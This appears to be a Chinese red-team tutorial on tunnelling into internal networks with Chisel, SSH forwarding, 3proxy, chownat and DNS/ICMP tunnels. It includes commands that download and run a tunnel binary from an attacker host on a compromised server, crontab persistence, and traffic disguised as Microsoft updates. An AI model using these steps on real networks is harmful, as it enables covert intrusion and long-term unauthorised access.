第一章：Chisel——万能HTTP隧道
============================================================

1.1 Chisel概述
------------------------------------------------------------
Chisel是一个用Go语言编写的TCP/UDP隧道工具，通过单一HTTP连接
传输数据。它使用HTTP进行隧道封装（可选WebSocket），能够穿越
大多数防火墙和代理服务器。

核心特点：
- 单个HTTP连接承载多个隧道
- 支持正向和反向端口转发
- 支持SOCKS5代理
- 使用SSH协议进行身份验证和数据加密
- 防火墙友好（流量伪装为普通HTTP/HTTPS）
- 跨平台（Windows/Linux/MacOS）

1.2 安装Chisel
------------------------------------------------------------
在ArchStrike上安装：
  sudo pacman -S chisel

手动安装：
  # 下载编译好的二进制文件
  wget https://github.com/jpillora/chisel/releases/latest
  
  # 或从源码编译
  go install github.com/jpillora/chisel@latest

1.3 Chisel基础概念
------------------------------------------------------------
(1) 服务端与客户端
  - 服务端(Server)：在可被访问的机器上运行，等待客户端连接
  - 客户端(Client)：主动连接服务端，请求建立隧道

(2) 正向隧道（Forward）
  客户端连接服务端后，在服务端开放端口，将流量转发到客户端的
  内部网络。类似SSH的远程转发(-R)。

(3) 反向隧道（Reverse）
  客户端连接服务端后，在服务端开放端口，将流量转发到服务端
  可以访问的网络。这是最常见的穿透场景。

1.4 Chisel实战——内网穿透
------------------------------------------------------------
场景：攻击机在外网，目标机在内网。需要通过目标机访问内网资源。

(1) 在攻击机（或可公网访问的VPS）上启动chisel服务端
  命令：
    chisel server -p 8080 --reverse
    
  参数说明：
  - server：以服务端模式运行
  - -p 8080：监听8080端口（可改为80或443以伪装Web流量）
  - --reverse：允许客户端创建反向隧道

  实战建议：
  - 使用80或443端口可以伪装成正常Web服务
  - 高权限端口需要root权限
  - 配合Nginx反代可以使流量更难被检测
  - 建议使用HTTPS（需要证书）增加隐蔽性

(2) 在目标机（内网机器）上运行chisel客户端
  
  基本反向SOCKS代理：
    chisel client 192.168.1.100:8080 R:1080:socks
    
  参数说明：
  - client：以客户端模式运行
  - 192.168.1.100:8080：攻击机的IP和端口
  - R:1080:socks：在攻击机本地1080端口开放SOCKS5代理
    - R表示反向(Reverse)
    - 1080是攻击机上的监听端口
    - socks表示这是一个SOCKS5代理

  反向端口转发示例：
    chisel client 攻击机IP:8080 R:2222:127.0.0.1:22
    
  含义：当有人连接攻击机的2222端口时，流量会被转发到
        目标机本地的127.0.0.1:22（SSH端口）

(3) 正向隧道示例
  
  服务端：
    chisel server -p 8080
    
  客户端（希望暴露本机SSH端口）：
    chisel client 服务端IP:8080 2222:127.0.0.1:22
    
  含义：服务端监听2222端口，连接到该端口的流量转发到
        客户端的127.0.0.1:22

1.5 Chisel高级用法
------------------------------------------------------------
(1) 使用TLS加密（推荐）
  
  # 生成自签名证书
  openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
    -keyout chisel.key -out chisel.crt \
    -subj "/CN=update.microsoft.com"
  
  # 服务端使用TLS
  chisel server -p 443 --reverse --tls-key chisel.key --tls-cert chisel.crt
  
  # 客户端连接
  chisel client --tls-skip-verify 攻击机IP:443 R:1080:socks
  
  说明：
  - 使用443端口和TLS加密使流量看起来像正常HTTPS
  - --tls-skip-verify跳过证书验证（内网环境常用）
  - CN设为update.microsoft.com增加伪装效果

(2) 使用HTTP认证
  
  服务端：
    chisel server -p 8080 --reverse --auth "redteam:Str0ngP@ss"
  
  客户端：
    chisel client --auth "redteam:Str0ngP@ss" 攻击机IP:8080 R:1080:socks

(3) SSH隧道模式
  
  Chisel支持通过SSH连接进行身份验证和加密：
    chisel client --fingerprint <ssh-fingerprint> 攻击机IP:8080 R:1080:socks

(4) 多重端口转发
  
  一个chisel连接可以建立多个隧道：
    chisel client 攻击机IP:8080 \
      R:1080:socks \
      R:2222:127.0.0.1:22 \
      R:3389:192.168.1.50:3389 \
      R:8080:192.168.1.100:80
    
  这样做的好处：
  - 只需一条HTTP连接，减少检测风险
  - 所有隧道复用同一条加密通道
  - 便于管理和维护

(5) 使用WebSocket
  
  chisel client --backend ws:// 攻击机IP:8080 R:1080:socks
  
  WebSocket与HTTP相比：
  - 更低的延迟和开销
  - 更适合长连接和实时通信
  - 可能被更严格的DPI检测识别

第二章：SSH端口转发——渗透测试的必备技能
============================================================

2.1 SSH端口转发概述
------------------------------------------------------------
SSH不仅是远程登录工具，更是强大的隧道工具。通过SSH端口转发，
可以在加密的SSH连接上传输任意TCP流量。

三种转发模式：
- 本地转发（-L）：将本地端口转发到远程机器可访问的地址
- 远程转发（-R）：将远程端口转发回本地机器可访问的地址
- 动态转发（-D）：在本地创建SOCKS代理

2.2 本地端口转发（Local Forwarding）
------------------------------------------------------------
语法：ssh -L <本地端口>:<目标地址>:<目标端口> <SSH用户>@<SSH主机>

场景：本地机器无法直接访问target_host，但可以通过SSH访问
      jump_host，而jump_host可以访问target_host。

示例：
  ssh -L 8080:internal_host:80 user@jump_host

含义：
- 在本机监听8080端口
- 当有人连接本机8080时，建立SSH连接到jump_host
- jump_host将流量转发到internal_host的80端口
- 最终效果：访问本机8080 = 访问internal_host:80

多端口转发：
  ssh -L 8080:web.internal:80 \
      -L 3306:db.internal:3306 \
      -L 3389:rdp.internal:3389 \
      user@jump_host

实战场景：访问内网Web应用
  环境：
  - 攻击机：192.168.1.100（外网）
  - 跳板机：10.0.0.5（可以SSH访问，也能访问内网）
  - 内网Web服务器：172.16.0.100:80
  
  步骤：
  (1) 在攻击机执行：
      ssh -L 8080:172.16.0.100:80 user@10.0.0.5
  (2) 在攻击机浏览器访问：
      http://127.0.0.1:8080
  (3) 流量路径：
      本机8080 -> SSH加密 -> 10.0.0.5 -> 172.16.0.100:80

2.3 远程端口转发（Remote Forwarding）
------------------------------------------------------------
语法：ssh -R <远程端口>:<目标地址>:<目标端口> <SSH用户>@<SSH主机>

场景：攻击机在外网，目标机在内网且可以出站SSH连接。
     通过目标机主动连接攻击机，在攻击机上开放服务供访问。

示例：
  # 在目标机（内网机器）上执行
  ssh -R 4444:localhost:22 user@attacker_vps

含义：
- 在攻击机(attacker_vps)上监听4444端口
- 当有人连接攻击机4444端口时，流量被转发回目标机的22端口
- 这样攻击者就可以通过攻击机4444端口SSH回连到目标机

内网穿透实战：
  # 目标机执行（内网Windows或Linux服务器）
  ssh -R 1080:localhost:3389 user@攻击机IP
  
  # 再添加一层对内网其他机器的访问
  ssh -R 3389:192.168.1.50:3389 user@攻击机IP

这样攻击者从VPS连接127.0.0.1:3389即可访问目标内网的RDP服务。

持久化反向shell（autossh）：
  autossh -M 20000 -N -R 4444:localhost:22 user@攻击机IP
  
  autossh可以自动重连，确保隧道持续可用。
  -M 20000：监控端口，用于检查连接状态

2.4 动态端口转发（Dynamic Forwarding / SOCKS代理）
------------------------------------------------------------
语法：ssh -D <本地SOCKS端口> <SSH用户>@<SSH主机>

这是最常用的模式，创建本地SOCKS代理，通过SSH服务器访问
其能够到达的任何网络。

示例：
  ssh -D 1080 user@10.0.0.5

含义：
- 在本机创建SOCKS代理（监听1080端口）
- 所有发送到该SOCKS代理的请求都通过SSH服务器转发
- 效果等同于拥有SSH服务器的网络访问权限

使用场景：
  # 步骤1：建立SOCKS代理
  ssh -D 1080 user@jump_host
  
  # 步骤2：配置proxychains
  vim /etc/proxychains.conf
  添加：socks5 127.0.0.1 1080
  
  # 步骤3：通过代理访问内网
  proxychains nmap -sT -Pn 172.16.0.0/24
  proxychains firefox  (访问内网Web应用)
  proxychains smbclient -L 172.16.0.50

静默模式（不打开shell，只做转发）：
  ssh -f -N -D 1080 user@jump_host
  
  -f：后台运行
  -N：不执行远程命令（只做转发）
  -D：动态端口转发

2.5 SSH转发的安全加固
------------------------------------------------------------
(1) 使用密钥认证替代密码
    ssh-copy-id user@jump_host
    或手动：cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

(2) 限制SSH转发权限（服务器端配置）
    编辑 /etc/ssh/sshd_config：
      AllowTcpForwarding yes      # 允许TCP转发
      GatewayPorts yes             # 允许远程转发绑定到0.0.0.0
      PermitOpen 127.0.0.1:22      # 限制只能转发到特定地址

(3) SSH连接保活
    编辑 ~/.ssh/config：
      Host *
        ServerAliveInterval 60
        ServerAliveCountMax 3
    
    这可以防止隧道因空闲而断开。

(4) SSH跳板机（ProxyJump）
    编辑 ~/.ssh/config：
      Host internal_host
        HostName 172.16.0.100
        User admin
        ProxyJump user@jump_host:22
    
    使用：ssh internal_host
    自动通过jump_host中转

第三章：3proxy——快速搭建代理服务器
============================================================

3.1 3proxy概述
------------------------------------------------------------
3proxy是一个轻量级的代理服务器，支持HTTP/HTTPS/SOCKS/POP3/FTP
等多种代理协议。它可以快速在任何机器上搭建代理服务。

3.2 安装3proxy
------------------------------------------------------------
在ArchStrike上安装：
  sudo pacman -S 3proxy

3.3 基础配置
------------------------------------------------------------
配置文件通常位于 /etc/3proxy/3proxy.cfg：

  # 基础配置示例
  nserver 8.8.8.8
  nserver 8.8.4.4
  
  # 日志
  log /var/log/3proxy/3proxy.log D
  logformat "- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T"
  
  # DNS缓存
  nscache 65536
  timeouts 1 5 30 60 180 1800 15 60
  
  # 用户认证
  users user1:CL:pass1
  users user2:CL:pass2
  
  # 启动SOCKS代理
  auth strong
  socks -p1080
  
  # 启动HTTP代理
  proxy -p3128

3.4 快速启动SOCKS代理（最简单方式）
------------------------------------------------------------
  # 一行命令启动SOCKS5代理
  3proxy socks5 -p1080

  # 带认证的SOCKS5代理
  3proxy socks5 -p1080 -s"-a" -l"/var/log/3proxy.log"
  
  # 在后台运行
  nohup 3proxy socks5 -p1080 &

3.5 3proxy实战场景
------------------------------------------------------------
(1) 在肉鸡上搭建SOCKS代理
  
  将3proxy上传到已控制的机器并启动：
    scp /usr/bin/3proxy user@target:/tmp/
    ssh user@target "/tmp/3proxy socks5 -p3128 &"
  
  然后在proxychains中添加：
    socks5 <target_ip> 3128

(2) 搭建多协议代理服务器
  
  完整配置 /etc/3proxy/3proxy.cfg：
    daemon
    nserver 8.8.8.8
    log /var/log/3proxy/3proxy.log
    
    auth iponly
    allow * 127.0.0.1,192.168.0.0/16
    socks -p1080
    proxy -p3128
    tcppm -p8443 127.0.0.1:22
    
  说明：
  - 同时提供SOCKS(1080)和HTTP(3128)代理
  - 通过tcppm将8443端口映射到本地SSH端口
  - 使用iponly认证仅允许内网IP访问

(3) 代理链配合使用
  
  在A机器运行3proxy：
    3proxy socks5 -p1080
  
  在B机器配置proxychains指向A：
    socks5 <A_ip> 1080
  
  在C机器链式连接：
    [ProxyList]
    socks5 <A_ip> 1080
    socks5 <B_ip> 2080

第四章：Chownat——NAT穿透先锋
============================================================

4.1 为什么需要Chownat
------------------------------------------------------------
在内网渗透中，经常遇到严格的NAT环境，传统的端口转发工具
可能无法工作。chownat通过创新的连接方式实现NAT穿透。

4.2 Chownat工作原理
------------------------------------------------------------
chownat采用"同时连接"技术：
- 客户端和服务器同时互相发起连接
- NAT设备将两者视为各自发起的出站连接
- 从而在两个NAT后面的机器之间建立通信

chownat不依赖UPnP、端口映射或第三方服务器。

4.3 Chownat基本使用
------------------------------------------------------------
(1) 服务端模式
    chownat -s 8080 -d 本机SSH端口22

(2) 客户端模式  
    chownat -c 攻击机IP:8080 -d 本地映射端口2222

(3) 连接建立后
    客户端连接 127.0.0.1:2222 即可访问服务端的22端口

4.4 Chownat的局限性
------------------------------------------------------------
- 需要两个方向都能出站（不适用于单向防火墙）
- 可靠性低于SSH/Chisel
- 不适合传输大量数据
- 连接建立的成功率取决于NAT类型

第五章：综合实践——多层内网穿透
============================================================

实践目标：
模拟真实渗透场景：通过外网Web服务器作为跳板，获取内网访问
权限，并最终访问深层网络中的数据库服务器。

网络拓扑：
- 攻击机：192.168.1.100（外网，我们控制的机器）
- Web服务器：10.0.0.5（DMZ区域，已获取SSH权限）
- 内网数据库：172.16.0.50:3306（核心内网）
- 内网文件服务器：172.16.0.60:445（内网SMB）

步骤详解：

Step 1: 通过SSH建立第一层动态转发
  命令：
    ssh -f -N -D 1080 root@10.0.0.5
  
  说明：
  - 在攻击机本地1080端口创建SOCKS代理
  - 流量通过Web服务器(10.0.0.5)中转
  - -f 后台运行，-N 不执行命令
  
  验证：
    netstat -tlnp | grep 1080
    # 应显示127.0.0.1:1080 LISTEN

Step 2: 配置proxychains指向第一层SOCKS代理
  编辑：vim /etc/proxychains.conf
  确保配置：
    dynamic_chain
    proxy_dns
    [ProxyList]
    socks5 127.0.0.1 1080
  
  验证代理：
    proxychains curl -s http://172.16.0.50:3306
    # 如果返回MySQL错误信息，说明网络已通

Step 3: 使用proxychains扫描内网
  命令：
    proxychains nmap -sT -Pn -F 172.16.0.0/24
  
  说明：
  - 通过Web服务器扫描整个172.16.0.0/24网段
  - 发现内网存活主机和服务
  - -F 快速扫描常见端口

Step 4: 将chisel上传到Web服务器建立第二层隧道
  命令：
    # 在攻击机启动chisel服务端
    chisel server -p 8080 --reverse
  
  # 在Web服务器上执行（通过上传或下载）
    ssh root@10.0.0.5 "wget http://192.168.1.100:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel"
    ssh root@10.0.0.5 "/tmp/chisel client 192.168.1.100:8080 R:2080:socks"
  
  说明：
  - 在Web服务器上运行chisel客户端
  - 在攻击机2080端口创建第二层SOCKS代理
  - 此代理的出口是Web服务器，可访问172.16.0.0/24

Step 5: 配置proxychains使用chisel代理
  编辑：vim /etc/proxychains.conf
  修改代理列表：
    [ProxyList]
    socks5 127.0.0.1 2080
  
  验证：
    proxychains curl -s http://172.16.0.50:3306
    proxychains smbclient -L //172.16.0.60

Step 6: 通过多层隧道访问数据库
  命令：
    proxychains mysql -h 172.16.0.50 -u root -p
    proxychains sqlmap -u "http://172.16.0.50/admin.php" --dbs

Step 7: 保持持久化
  为了维持长期访问，考虑以下措施：
  
  (1) 在Web服务器添加crontab定时任务自动重连：
      */5 * * * * /tmp/chisel client 攻击机IP:8080 R:2080:socks
  
  (2) 使用autossh保持SSH隧道：
      autossh -M 20000 -f -N -D 1080 root@10.0.0.5
  
  (3) 使用3proxy在Web服务器搭建代理：
      ssh root@10.0.0.5 "3proxy socks5 -p3128 &"
      在proxychains中添加：socks5 10.0.0.5 3128

第六章：高级隧道技术补充
============================================================

6.1 DNS隧道（iodine/DNScat2）
------------------------------------------------------------
当HTTP/HTTPS被严格限制时，DNS隧道可能是最后的出路。

iodine：
  # 服务端（攻击机，需要域名NS记录指向自己）
  iodined -f -P password 10.0.0.1 tunnel.example.com
  
  # 客户端（目标机）
  iodine -f -P password 攻击机IP tunnel.example.com

DNScat2：
  # 服务端
  dnscat2-server yourdomain.com
  
  # 客户端
  ./dnscat yourdomain.com

6.2 ICMP隧道（ptunnel）
------------------------------------------------------------
  # 服务端（攻击机）
  ptunnel -p 代理服务器IP -lp 1080 -da 目标IP -dp 22
  
  # 客户端（目标机）
  ptunnel -c 攻击机IP -lp 22 -da 跳板机IP -dp 1080

6.3 SMB隧道
------------------------------------------------------------
通过SMB命名管道建立的隐蔽隧道，利用Windows的IPC$共享。

6.4 应用层隧道总结
------------------------------------------------------------
| 协议 | 隐蔽性 | 速度 | 稳定性 | 适用场景           |
|------|--------|------|--------|-------------------|
| SSH  | 中     | 高   | 高     | 有SSH权限时首选    |
| HTTP | 高     | 高   | 高     | 严格出站策略       |
| DNS  | 极高   | 低   | 中     | HTTP被阻时         |
| ICMP | 高     | 低   | 低     | 仅ICMP允许时       |
| SMB  | 高     | 中   | 中     | Windows域环境      |

============================================================
总结
============================================================

内网隧道和端口转发是红队渗透测试的核心技术。本教程涵盖了：

- Chisel：最通用的HTTP隧道工具，适合穿越防火墙
- SSH端口转发：最可靠的隧道方案，三种模式覆盖所有场景
- 3proxy：快速搭建代理服务器的轻量级方案
- Chownat：NAT穿透的后备选择

关键原则：
1. 优先使用SSH（简单可靠）
2. 防火墙限制时使用Chisel（伪装HTTP）
3. HTTP被阻时使用DNS隧道（最后手段）
4. 始终保持多层冗余隧道，防止单点失效
5. 注意OPSEC，使用加密和认证保护隧道
